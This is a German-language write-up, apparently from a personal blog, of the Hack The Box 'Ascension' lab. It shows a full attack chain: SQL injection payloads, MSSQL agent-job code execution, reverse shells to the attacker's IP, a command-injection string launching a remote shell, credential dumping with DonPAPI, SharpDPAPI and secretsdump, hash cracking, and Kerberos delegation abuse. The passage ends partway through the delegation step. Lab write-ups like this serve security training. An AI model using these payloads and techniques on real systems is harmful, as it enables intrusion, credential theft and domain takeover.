---
title: Writeup_FullHouse
date: 2024-01-03 11:45:00 +0100
categories: [HTB, Endgames]
tags: [dirsearch, proxychains, enum4linux, runas, msfconsole, bloodhount, hashcat, DonPAPI, msfvenom, ssh_port_forwarding, xc-shell, slack-parser, rubeus, sharodapi]
comments: false
---

Introduction

```
Ascension

By egre55 and TRX

Daedalus Airlines is quickly becoming a major player in global aviation.

The pace of growth has meant that the company has accumulated a lot of technical debt. In order to avoid a data breach and potentially putting their supply chain at risk, Daedalus have hired your Cyber Security firm to test their systems.

Ascension is designed to test your skills in Enumeration, Exploitation, Pivoting, Forest Traversal and Privilege Escalation inside two small Active Directory networks.

The goal is to gain access to the trusted partner, pivot through the network and compromise two Active Directory forests while collecting several flags along the way. Can you Ascend?

Entry Point: 10.13.38.20
```

Initial nmap Scan

```
┌──(bumble㉿bumble)-[~]
└─$ nmap -sC -sV 10.13.38.20 --min-rate 50000 -Pn-
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 07:09 CET
Nmap scan report for 10.13.38.20
Host is up (0.082s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Daedalus Airlines
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds

```

Ich finde einen SQLi

```
POST /book-trip.php HTTP/1.1
Host: 10.13.38.20
Content-Length: 83
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.13.38.20
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.13.38.20/book-trip.php
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

destination=12%27UNION+SELECT+NULL,NULL,(@@version),NULL,NULL--&adults=1&children=1
```

![Bild1](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020221213081702.png){: width="700" height="400" }

SQLi-Enum

```
destination=12%27UNION+SELECT+NULL,NULL,db_name(),NULL,NULL--&adults=1&children=1
```

db_name = daedalus

```
destination=12%27UNION+SELECT+NULL,NULL,user_name(),NULL,NULL--&adults=1&children=1
```
username = deadalus

```
destination=12%27UNION+SELECT+NULL,NULL,@@servername,NULL,NULL--&adults=1&children=1
```

servername = SQL01

Da ich nun weiß das ein SQLi möglich ist, versuche ich die sqlmap --sql-shell

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/Ascension]
└─$ sqlmap -r req.txt -D deadalus --batch --sql-shell
[08:40:06] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2016 or 10 or 2022 or 11
web application technology: PHP 7.3.7, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017

```

versuchen wir uns hier etwas zu bewegen, für weitere Befehle auf der DB [[Enum_deadalus_db]]
Wir finden keine linked server.

Ich finde heraus das ich meinen User "daedalus" auf "daedalus_admin" IMPERSONATE kann. Dieser neue User kann SQL-Agent-Jobs erstellen.
Dafür Finde ich einen Exploit

https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution


Ich habe mir ein python3 script gebaut wo ich mir die Befehle erleichtern

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/Ascension]
└─$ python3 exploit_pwn.py PowerShell 10.10.14.4 80
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/Ascension]
└─$ python3 exploit_pwn.py CmdExec 10.10.14.4 1337 

┌──(bumble㉿bumble)-[/mnt/backup/xc]
└─$ rlwrap ./xc -l 1337
[*] Auto-Plugins:
[xc: C:\WINDOWS\system32]: cd c:\users
Unable to change dir: chdir c:users: The system cannot find the file specified.
[xc: C:\WINDOWS\system32]: cd c:\
[xc: C:\WINDOWS\system32]: cd ..
[xc: C:\WINDOWS]: cd ..
[xc: C:\]: cd users
[xc: C:\users]: cd svc_dev
[xc: C:\users\svc_dev]: cd desktop
[xc: C:\users\svc_dev\desktop]: dir
 Volume in drive C has no label.
 Volume Serial Number is 81D2-D2F2

 Directory of C:\users\svc_dev\desktop

06/09/2021  04:29 AM    <DIR>          .
06/09/2021  04:29 AM    <DIR>          ..
10/14/2020  09:38 AM                34 flag.txt
               1 File(s)             34 bytes
               2 Dir(s)  10,538,934,272 bytes free
[xc: C:\users\svc_dev\desktop]: type flag.txt
[xc: C:\users\svc_dev\desktop]: 

```

Ich finde flag 1

Laden wir auch noch zusätzlich winpeas.exe hoch
```
2 Dir(s)  10,515,845,120 bytes free
[xc: C:\users\svc_dev\music]: !upload /mnt/backup/Windows-Tools/winpeas.exe C:\\users\\svc_dev\\music\\wp.exe
[+] Upload complete
[xc: C:\users\svc_dev\music]: dir
 Volume in drive C has no label.
 Volume Serial Number is 81D2-D2F2

 Directory of C:\users\svc_dev\music

12/23/2022  03:24 AM    <DIR>          .
12/23/2022  03:24 AM    <DIR>          ..
12/23/2022  02:34 AM         4,470,272 bumble_pwn.exe
12/23/2022  03:24 AM         1,966,080 wp.exe

```

Ich finde erstmal mit winpeas nichts. Versuche mich danach manuell mit einer piv escalation. Aber hierfür brauche ich msfconsole da hier die xct-shell kein output liefert

```
msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.4
lhost => 10.10.14.4
msf6 exploit(multi/handler) > set lport 9003
lport => 9003
msf6 exploit(multi/handler) > run
```

Jetzt noch in der xct-shell aufrufen

```
[xc: C:\WINDOWS\system32]: !met 9003
```



```

schtasks /query /fo LIST /v 

Folder: \Microsoft\Windows\Autochk
HostName:                             WEB01
TaskName:                             \Microsoft\Windows\Autochk\AutochkTask
Next Run Time:                        12/29/2022 5:17:47 AM
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        12/29/2022 5:16:47 AM
Last Result:                          267009
Author:                               DAEDALUS\Administrator
Task To Run:                          powershell net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          svc_dev
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute 
Start Time:                           4:13:47 AM
Start Date:                           1/13/2020
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 1 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

```

ich finde neue Zugangsdaten. Versuchen wir mal eine neue shell als diesen user zu bekommen

```
PS C:\Users\svc_dev\Music> .\runas.exe billing_user D43d4lusB1ll1ngB055 powershell -r 10.10.14.4:9002 -d daedalus.local -l 2

┌──(bumble㉿bumble)-[~]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.4] from (UNKNOWN) [10.13.38.20] 50171
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
whoami
daedalus\billing_user

```


Nachdem ich die Flag2 gefunden habe habe ich mir die das Endgame angeschaut und gesehen das es noch weitere Computer bzw. DC geben muss.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net view
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.10.39:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.10.39:5985  ...  OK
Server Name            Remark

-------------------------------------------------------------------------------
\\DC1
\\WEB01
The command completed successfully.

```

Nachdem ich lokale Admin-Rechte habe lasse ich DonPapi laufen

```
┌──(bumble㉿bumble)-[~/Downloads/HTB/Ascension/DonPAPI]
└─$ proxychains python3 DonPAPI.py daedalus.local/billing_user:D43d4lusB1ll1ngB055@192.168.10.39
INFO [192.168.10.39] [+]  
[CREDENTIAL]                                                                                                                                                                                      LastWritten : 2020-10-14 12:35:22                                                                Flags       : 48 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)                     Persist     : 0x3 (CRED_PERSIST_ENTERPRISE)                                                      Type        : 0x2 (CRED_PERSIST_LOCAL_MACHINE)                                                   Target      : Domain:interactive=DAEDALUS\svc_backup                                             Description :                                                                                    Unknown     :                                                                                    Username    : DAEDALUS\svc_backup                                                                Unknown3     : jkQXAnHKj#7w#XS$ 
......
INFO [192.168.10.39] [+]  
[CREDENTIAL]                                                                                                                       LastWritten : 2020-10-13 09:56:34                                                                                                                                                                                                                                                              Username    : DAEDALUS\Administrator                                                                                                                                                                                                        
Unknown3     : pleasefastenyourseatbelts01!            


└─$ proxychains -q ./cme smb 192.168.10.6 -u svc_backup -p 'jkQXAnHKj#7w#XS$'
SMB         192.168.10.6    445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
SMB         192.168.10.6    445    DC1              [+] daedalus.local\svc_backup:jkQXAnHKj#7w#XS$ 

┌──(bumble㉿bumble)-[~]
└─$ proxychains evil-winrm -i 192.168.10.6 -u svc_backup -p 'jkQXAnHKj#7w#XS$'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Desktop> dir


    Directory: C:\Users\svc_backup.DAEDALUS\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/14/2020  10:41 AM             29 flag.txt


*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\Desktop> type flag.txt

```

Ich finde Flag3

Im DonPapi Output finde ich auch die Logindaten für Administrator

```
┌──(bumble㉿bumble)-[~]
└─$ proxychains evil-winrm -i 192.168.10.6 -u administrator -p 'pleasefastenyourseatbelts01!'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/14/2020  10:40 AM             27 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt

```

Ich finde Flag4

Ich entscheide mich mit Remmina auf die Box drauf zu gehen

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Evil-WinRM* PS C:\Users\Administrator\Documents> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.10.6:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.10.6:5985  ...  OK

proxychains remmina

```

![Bild2](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230102203110.png){: width="700" height="400" }
Wenn ich auf Username gehe plobt gleich "Elliot" auf. Hier habe ich noch Kennwörter gefunden, aber da ich Dom-Admin bin kann ich dies sicherlich dumpen

```
┌──(bumble㉿bumble)-[/mnt/backup/impacket/examples]
└─$ proxychains python3 secretsdump.py daedalus.local/administrator:'pleasefastenyourseatbelts01!'@192.168.10.6 -dc-ip 192.168.10.6
    daedalus.local\elliot:1112:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::

┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/Ascension] 
└─$ hashcat -m 1000 '74fdf381a94e1e446aaedf1757419dcd' /mnt/backup/rockyou.txt 

74fdf381a94e1e446aaedf1757419dcd:84@m!n@9

```

Melden wir uns mal an
![Bild3](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230102225430.png){: width="700" height="400" }


Ich finde Scripts welche ich ausführen kann


![Bild4](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230103130955.png){: width="700" height="400" }

![Bild5](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230103131015.png){: width="700" height="400" }

![Bild6](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230103131035.png){: width="700" height="400" }

![Bild7](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230103131105.png){: width="700" height="400" }

Ich finde Flag 5 ASCENSION.

Ich habe einen Weg gefunden eine stabile shell zu erhalten.

Hierfür habe ich die GPO-Richtlinen angepasst, sodass ich erstmal die Firewall ausschalte


![Bild8](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230110083552.png){: width="700" height="400" }

Danach habe ich mir Netzlaufwerk erstellt, wo Elliot darauf zugriff hat.

![Bild9](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230110083659.png){: width="700" height="400" }

Als nächstes habe ich mir xc auf die Box geladen und in das Verzeichnis kopiert

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/bumble/Downloads/xc/xc.exe
```

Danach xc gestartet und mit dem Befehl ausgeführt

```
.\xc.exe -l -p 1337
```

![Bild10](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230110083849.png){: width="700" height="400" }


Als nächstes mit dem Script xc auf der 11.210 ausführen.

```
foo||cmd.exe /c \\DC1\bumble\xc.exe 192.168.11.6 1337||bar
```

![Bild11](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230110084009.png){: width="700" height="400" }


Danach ein  Portfording durchführen

![Bild12](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230110084041.png){: width="700" height="400" }
```
[xc: C:\Users\elliot]: !lfwd 2222 127.0.0.1 22
```

Jetzt nur noch ssh starten

```
ssh megaairline.local\elliot@127.0.0.1 -p 2222
```

Ich finde interessante Dateien

```
megaairline\elliot@MS01 C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB>dir
 Volume in drive C has no label.
10/16/2020  06:50 AM    <DIR>          ..
10/16/2020  06:50 AM    <DIR>          https_app.slack.com_0.indexeddb.blob
10/16/2020  06:51 AM    <DIR>          https_app.slack.com_0.indexeddb.leveldb
```

kopieren wir die mal rüber

```
megaairline\elliot@MS01 C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00>copy 7 \\DC1\bumble\

*Evil-WinRM* PS C:\Users\Administrator\Documents> download 7 /home/bumble/7

```

Ich finde ein tool wo ich mir die Datei besser anschauen kann.

https://github.com/0xHasanM/Slack-Parser


![Bild12](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230111105727.png){: width="700" height="400" }

ich finde neue Zugangsdaten

```
Insert the data you want (users, messages, workspace): messages
6local accountusername: elliotpassword: LetMeInAgain!{$ {$ {$ 
!MS01 admin account and password:{$ {o
elliotLetMeInAgain!{$ {$ {$
```

Nachdem ich hier keinen Erfolg mit runsas oder ssh hatte habe ich nmap auf der kiste 11.6 installiert und mal die 11.210 gescannt

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-11 04:52 Pacific Standard Time
NSOCK ERROR [0.5210s] ssl_init_helper(): OpenSSL legacy provider failed to load.

NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating ARP Ping Scan at 04:52
Scanning 192.168.11.210 [1 port]
Completed ARP Ping Scan at 04:52, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:52
Completed Parallel DNS resolution of 1 host. at 04:53, 13.04s elapsed
Initiating SYN Stealth Scan at 04:53
Scanning 192.168.11.210 [1000 ports]
Discovered open port 3389/tcp on 192.168.11.210
Discovered open port 443/tcp on 192.168.11.210
Discovered open port 445/tcp on 192.168.11.210
Discovered open port 80/tcp on 192.168.11.210
Discovered open port 135/tcp on 192.168.11.210
Discovered open port 139/tcp on 192.168.11.210
Completed SYN Stealth Scan at 04:53, 4.78s elapsed (1000 total ports)
Initiating Service scan at 04:53
Scanning 6 services on 192.168.11.210
Completed Service scan at 04:53, 12.08s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 192.168.11.210
Retrying OS detection (try #2) against 192.168.11.210
NSE: Script scanning 192.168.11.210.
Initiating NSE at 04:53
Completed NSE at 04:54, 40.54s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.12s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Nmap scan report for 192.168.11.210
Host is up (0.00079s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=MS01.megaairline.local
| Issuer: commonName=MS01.megaairline.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-10-12T22:24:27
| Not valid after:  2025-10-12T22:24:27
| MD5:   2d539daa0145474ecfd4eb7f9d08d20f
|_SHA-1: 059015317786a85fd6b198aff3c36212adf193ad
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2023-01-11T12:54:10+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MS01.megaairline.local
| Issuer: commonName=MS01.megaairline.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-10T03:26:00
| Not valid after:  2023-07-12T03:26:00
| MD5:   a4f7f2ef09ae4f429f74265ee0df9c1e
|_SHA-1: c10835fbba276cdc59bd6553790c474bf5e012f9
|_ssl-date: 2023-01-11T12:54:10+00:00; 0s from scanner time.
MAC Address: 00:50:56:B9:02:34 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 005056b90234 (VMware)
| Names:
|   MS01<00>             Flags: <unique><active>
|   MEGAAIRLINE<00>      Flags: <group><active>
|_  MS01<20>             Flags: <unique><active>
| smb2-time: 
|   date: 2023-01-11T12:53:30
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.79 ms 192.168.11.210

NSE: Script Post-scanning.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Read data files from: C:\Program Files (x86)\Nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.54 seconds
           Raw packets sent: 2071 (94.816KB) | Rcvd: 51 (3.494KB)

```

Ich sehe das Port 3389 offen ist, versuchen wir eine RDP Session dort aufzubauen

![Bild13](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230112083724.png){: width="700" height="400" }

Passwort:  LetMeInAgain!

Da der user Lokaler-Admin ist kann ich ganz einfach in der RDP-Session auf alle Verzeichnisse zugreifen. Im lokalen Administrator Acoount finde ich die Flag

![[Pasted image 20230112083900.png]]
![Bild14](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230112083900.png){: width="700" height="400" }

Da ich auch hier ein lokaler Admin bin, versuche ich Creds herauszufinden. Leider kann ich nicht wie voherher DonPAPI nehmen da ich Proxychains nicht zum laufen bekommen habe. Also entscheide ich mich für SHARPDAPI

```
C:\Users\elliot.MS01\Documents>.\SharpDPAPI.exe machinetriage

Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 7E6A4CF66305FBFB5B060CD27A723F46

    guidMasterKey    : {360b584f-7027-4f23-85ad-b13720f57979}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/14/2020 10:33:07 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{A7499C51-AB7C-44BF-9314-6A305239E450}
    TargetAlias      :
    Comment          :
    UserName         : MS01\Administrator
    Credential       : FWErfsgt4ghd7f6dwx

```

Ich finde mit dem ein neues Password.
Leider ist es nicht der Domänen-Administrator 

```
C:\Users\elliot.MS01\Documents>.\RunasCs.exe administrator FWErfsgt4ghd7f6dwx -l 2 whoami
ms01\administrator
```

Daraufhin habe ich versucht dieses Passwort bei den mir bekannten Domänen Usern zu verwenden


![Bild15](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118213337.png){: width="700" height="400" }
Einzig bei Anna erhalte eine andere Fehlermeldung

Schauen wir uns mal den User an


![Bild16](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118213422.png){: width="700" height="400" }
dieser darf nur mit dem DC2 kommunizieren.
Versuchen wir ob das Password grundsätzlich funktioniert

```
PS C:\Users\elliot> \\DC1\bumble\kerbrute.exe bruteuser -d megaairline.local --dc dc2.megaairline.local \\DC1\bumble\password.txt.txt anna

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/13/23 - Ronnie Flathers @ropnop

2023/01/13 02:50:24 >  Using KDC(s):
2023/01/13 02:50:24 >   dc2.megaairline.local:88
2023/01/13 02:50:24 >  [+] VALID LOGIN:  anna@megaairline.local:FWErfsgt4ghd7f6dwx
2023/01/13 02:50:24 >  Done! Tested 1 logins (1 successes) in 0.051 seconds
PS C:\Users\elliot>
```

Schauen wir uns den User doch etwas genauer mit Bloodhound an

![Bild17](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118213741.png){: width="700" height="400" }



![Bild18](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118213826.png){: width="700" height="400" }

Ich habe den Weg gefunden. Nun muss ich mir überlegen wie ich eine Shell als anna erhalte

Hierfür habe ich versucht mit Rebeus ein Kerberos Ticket zu erstellen um eine Shell als Anna zu erhalten

```
PS C:\Users\elliot\Documents> .\Rubeus.exe asktgt /user:anna /password:FWErfsgt4ghd7f6dwx /ptt /domain:megaairline.local /dc:dc2 /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show
```


![Bild19](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118214055.png){: width="700" height="400" }
![Bild20](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118214127.png){: width="700" height="400" }


Es öffnet sich eine neue Shell

Nun habe ich mich nach der Anleitung versucht

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

Als erstes lade(evil-winrm Administrator 10.6) ich mir alles benötigen Tools auf die Maschine

```
upload /mnt/backup/Windows-Tools/Rubeus.exe
upload /mnt/backup/Windows-Tools/Powermad.ps1
upload /mnt/backup/Windows-Tools/powerview.ps1
```

Danach verschiebe ich die in das Netzlaufwerk "bumble" wo ich mir extra dafür erstellt habe


![Bild21](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118214536.png){: width="700" height="400" }

Leider dachte ich zuerst das wenn ich in der neuen shell "whoami" versuche auch anna angezeigt wird, das liegt daran das der Befehl lokal ausgeführt wird aber remote weitergesendet wird.


![Bild22](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118214757.png){: width="700" height="400" }

Nachdem ich das herausgefunden habe, ging es los

```
PS C:\Users\elliot\Documents> Import-Module .\Powermad.ps1
PS C:\Users\elliot\Documents> Import-Module .\powerview.ps1
```

Leider habe ich gleich beim ersten Befehl eine Fehlermeldung bekommen


![Bild23](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118214858.png){: width="700" height="400" }
Nach einigen Google-Seiten habe ich herausgefunden das ich die Befehle anpassen muss.

```
PS C:\Users\elliot\Documents> Get-DomainObject -Identity "dc=megaairline,dc=local" -Domain megaairline.local -Server dc2.megaairline.local


msds-isdomainfor                            : CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
                                              =Configuration,DC=megaairline,DC=local
lockoutobservationwindow                    : -18000000000
iscriticalsystemobject                      : True
maxpwdage                                   : -9223372036854775808
msds-alluserstrustquota                     : 1000
distinguishedname                           : DC=megaairline,DC=local
objectclass                                 : {top, domain, domainDNS}
pwdproperties                               : 1
gplink                                      : [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,D
                                              C=megaairline,DC=local;0]
name                                        : megaairline
wellknownobjects                            : {B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS
                                              Quotas,DC=megaairline,DC=local,
                                              B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program
                                              Data,DC=megaairline,DC=local,
                                              B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program
                                              Data,DC=megaairline,DC=local, B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=Fo
                                              reignSecurityPrincipals,DC=megaairline,DC=local...}
serverstate                                 : 1
nextrid                                     : 1000
objectsid                                   : S-1-5-21-775547830-308377188-957446042
msds-behavior-version                       : 7
fsmoroleowner                               : CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
                                              =Configuration,DC=megaairline,DC=local
repluptodatevector                          : {2, 0, 0, 0...}
uascompat                                   : 1
dsasignature                                : {1, 0, 0, 0...}
ridmanagerreference                         : CN=RID Manager$,CN=System,DC=megaairline,DC=local
ntmixeddomain                               : 0
whenchanged                                 : 1/18/2023 3:25:49 AM
msds-perusertrusttombstonesquota            : 10
instancetype                                : 5
lockoutthreshold                            : 0
objectguid                                  : 30af30a8-6272-4195-90ac-0e4ab6b5c668
auditingpolicy                              : {0, 1}
msds-perusertrustquota                      : 1
systemflags                                 : -1946157056
objectcategory                              : CN=Domain-DNS,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata                       : 1/1/1601 12:00:00 AM
otherwellknownobjects                       : {B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=megaairline,DC=local,
                                              B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service
                                              Accounts,DC=megaairline,DC=local}
creationtime                                : 133184859497495535
whencreated                                 : 10/10/2020 3:46:18 PM
minpwdlength                                : 7
msds-nctype                                 : 0
pwdhistorylength                            : 24
dc                                          : megaairline
msds-masteredby                             : CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
                                              =Configuration,DC=megaairline,DC=local
usncreated                                  : 4099
subrefs                                     : {DC=ForestDnsZones,DC=megaairline,DC=local,
                                              DC=DomainDnsZones,DC=megaairline,DC=local,
                                              CN=Configuration,DC=megaairline,DC=local}
msds-expirepasswordsonsmartcardonlyaccounts : True
masteredby                                  : CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN
                                              =Configuration,DC=megaairline,DC=local
lockoutduration                             : -18000000000
usnchanged                                  : 122918
modifiedcountatlastprom                     : 0
modifiedcount                               : 1
forcelogoff                                 : -9223372036854775808
ms-ds-machineaccountquota                   : 10
minpwdage                                   : -864000000000
```

Das hat sich für alle weiteren Befehle durchgezogen

```
PS C:\Users\elliot\Documents> Get-DomainComputer DC2 -Server dc2.megaairline.local  | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC2

PS C:\Users\elliot\Documents> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose -Domain megaairline.local -DomainController dc2.megaairline.local
VERBOSE: [+] SAMAccountName = FAKE01$
VERBOSE: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=megaairline,DC=local
[+] Machine account FAKE01 added

PS C:\Users\elliot\Documents> Get-DomainComputer fake01 -Server dc2.megaairline.local


pwdlastset             : 1/18/2023 7:58:55 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE01,CN=Computers,DC=megaairline,DC=local
